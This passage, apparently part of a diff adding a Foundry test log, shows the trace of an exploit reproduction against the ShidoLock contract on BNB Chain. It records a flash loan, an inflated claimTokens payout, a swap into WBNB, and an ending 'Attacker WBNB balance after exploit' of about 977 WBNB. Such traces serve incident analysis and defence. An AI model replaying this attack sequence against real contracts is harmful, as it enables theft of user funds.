+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7ef6E527969054afbc0980E00C51D2E645b4A5ef, value: 10436974088156420258 [1.043e19])
+    │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: ShidoLock: [0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4], value: 115792089237316195423570985008687907853269984665640564039447147033824973219677 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0x17912e02c6c3ca3a1649dc02ce98e541f5b6d65af6ff5b3aaaa376eebe2cd856 → 0
+    │   │   │   │   │   │   @ 0x3096b260420dabf29b82b6c2e08073d0f87cafcf0da927a6730631a77927b3b2: 0x04299b25791315b4325385efa3cfec4259901451f268bcc5e7a41c7f60d85f19 → 0x1bbac9283fd6dfee489d61f27268d1844f46eaace96818009247936e1f05376f
+    │   │   │   │   │   │   @ 0xbfbd819bee7413a014b56cf4a503f98b570a1273403ef6f1c629ebd3e612b335: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffff6f286b5d417ae75d
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 0x00000000000000000000000000000000000000000000000090d794a2be8518a2
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [82751] ShidoLock::claimTokens()
+    │   │   │   │   ├─ [52555] SHIDO::transferFrom(0x7ef6E527969054afbc0980E00C51D2E645b4A5ef, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10436974088156420258000000000 [1.043e28])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x7ef6E527969054afbc0980E00C51D2E645b4A5ef, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10436974088156420258000000000 [1.043e28])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xaecfb03da7424f86994e0675acabfc0d5da6b5f704b53baaaa1763b58ac357b6: 0x000000000000000000000000000000000000000024b118a16b62cd1730c2d401 → 0x000000000000000000000000000000000000000002f7d566644b1a0403df0001
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x000000000000000000000000000000000000000021b9433b0717b3132ce3d400
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xcbca2c2e1a1577eb2e25b9dce980a2cead88d4a5422449a454760a1d38d5b82a: 0 → 0x000000000000000000000000000000000000000021b9433b0717b3132ce3d400
+    │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0x00000000000000000000000000000000000000000000000090d794a2be8518a2 → 0
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [24690] SHIDO::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x44bf1039324fcbfda472196706fa68525cb38db0f3d91f5ca7d489ff92357e45: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [624] SHIDO::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 10436974088156420258000000000 [1.043e28]
+    │   │   │   ├─ [94438] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(10436974088156420258000000000 [1.043e28], 0, [0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1687561237 [1.687e9])
+    │   │   │   │   ├─ [37679] SHIDO::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0fb0dA54b6eF183fB4b67BFe01af44e06D576Ef3, 10436974088156420258000000000 [1.043e28])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SHIDO: [0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640], value: 1043697408815642025800000000 [1.043e27])
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0fb0dA54b6eF183fB4b67BFe01af44e06D576Ef3, value: 9393276679340778232200000000 [9.393e27])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 17: 0x0000000000000000000000000000000000000000000138b54e1d630a0bc102cc → 0x000000000000000000000000000000000000000001b0e27841ab5f31679933cc
+    │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x000000000000000000000000000000000000000021b9433b0717b3132ce3d400 → 0
+    │   │   │   │   │   │   @ 0xcdf630e154cf382b3dabdf9d169fd21053d93c25a4505689aeca70709f5face3: 0x0000000000000000000000000000000000000000054b9867e861651678b86a34 → 0x000000000000000000000000000000000000000023a5881d085d1fdaedebdc34
+    │   │   │   │   │   │   @ 16: 0x0000000000000000000000000000000000000000000138b54e1d630a0bc102cc → 0x000000000000000000000000000000000000000001b0e27841ab5f31679933cc
+    │   │   │   │   │   │   @ 0x6da01ce5f8483d30f28a88d1b669f44a60d198caf78700a855ff975907ec8f85: 0x00000000000000000000000000000000000000000002716a9c3ac61417820598 → 0x00000000000000000000000000000000000000000361c4f08356be62cf326798
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 980000000000000000 [9.8e17]
+    │   │   │   │   ├─ [2893] 0x0fb0dA54b6eF183fB4b67BFe01af44e06D576Ef3::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1638814202042634346612419124 [1.638e27], 1193802448178091070023 [1.193e21], 1687560670 [1.687e9]
+    │   │   │   │   ├─ [624] SHIDO::balanceOf(0x0fb0dA54b6eF183fB4b67BFe01af44e06D576Ef3) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 11032090881383412578812419124 [1.103e28]
+    │   │   │   │   ├─ [42532] 0x0fb0dA54b6eF183fB4b67BFe01af44e06D576Ef3::swap(0, 1016085114464703755854 [1.016e21], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   │   ├─ [8062] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1016085114464703755854 [1.016e21])
+    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0fb0dA54b6eF183fB4b67BFe01af44e06D576Ef3, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1016085114464703755854 [1.016e21])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x9e3146ce2a463be8bc056384a4454787c57e90041445d5b374c83f5ab9b4f57d: 0x000000000000000000000000000000000000000000000040b7564994decb1247 → 0x000000000000000000000000000000000000000000000009a252cd6cf000dbf9
+    │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000000d99a8cec7e20000 → 0x000000000000000000000000000000000000000000000037229d24f6b6ac364e
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [624] SHIDO::balanceOf(0x0fb0dA54b6eF183fB4b67BFe01af44e06D576Ef3) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 11032090881383412578812419124 [1.103e28]
+    │   │   │   │   │   ├─ [534] WBNB::balanceOf(0x0fb0dA54b6eF183fB4b67BFe01af44e06D576Ef3) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 177717333713387314169 [1.777e20]
+    │   │   │   │   │   ├─ emit Sync(reserve0: 11032090881383412578812419124 [1.103e28], reserve1: 177717333713387314169 [1.777e20])
+    │   │   │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 9393276679340778232200000000 [9.393e27], amount1In: 0, amount0Out: 0, amount1Out: 1016085114464703755854 [1.016e21], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 9: 0x000000000000000000000000000000000000049575202c6134fb486abfc460e0 → 0x00000000000000000000000000000000000004b086afb40d8cdb47c7e312d4d9
+    │   │   │   │   │   │   @ 8: 0x649621de000000000040b7564994decb12470000054b9867e861651678b86a34 → 0x64962415000000000009a252cd6cf000dbf9000023a5881d085d1fdaedebdc34
+    │   │   │   │   │   │   @ 10: 0x0000000000000000000000000008e153cbc71b4f8b1c7664fe0995192c92d567 → 0x00000000000000000000000000090fb89f26727d4059ba754f7054f3d550d576
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1017065114464703755854 [1.017e21]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [3262] WBNB::transfer(dodo: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d], 40000000000000000000 [4e19])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: dodo: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d], value: 40000000000000000000 [4e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000037229d24f6b6ac364e → 0x000000000000000000000000000000000000000000000034f78098e48f0c364e
+    │   │   │   │   │   @ 0x3c60da1376f85a7f3c888682818856b0c611572c8d06dc51114a9951a6f90e17: 0x0000000000000000000000000000000000000000000000316e0518a1e644e632 → 0x0000000000000000000000000000000000000000000000339921a4b40de4e632
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] WBNB::balanceOf(dodo: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]) [staticcall]
+    │   │   │   └─ ← [Return] 951818229414455731762 [9.518e20]
+    │   │   ├─ [2531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(dodo: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]) [staticcall]
+    │   │   │   └─ ← [Return] 223537322073875815650524 [2.235e23]
+    │   │   ├─ [534] WBNB::balanceOf(dodo: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]) [staticcall]
+    │   │   │   └─ ← [Return] 951818229414455731762 [9.518e20]
+    │   │   ├─ [531] 0x55d398326f99059fF775485246999027B3197955::balanceOf(dodo: [0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d]) [staticcall]
+    │   │   │   └─ ← [Return] 223537322073875815650524 [2.235e23]
+    │   │   ├─ emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 40000000000000000000 [4e19], : 0)
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 977065114464703755854 [9.77e20]
+    ├─ [2444] WBNB::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance after exploit", val: 977065114464703755854 [9.77e20], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 32.31s (31.21s CPU time)
+
+Ran 1 test suite in 32.31s (32.31s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
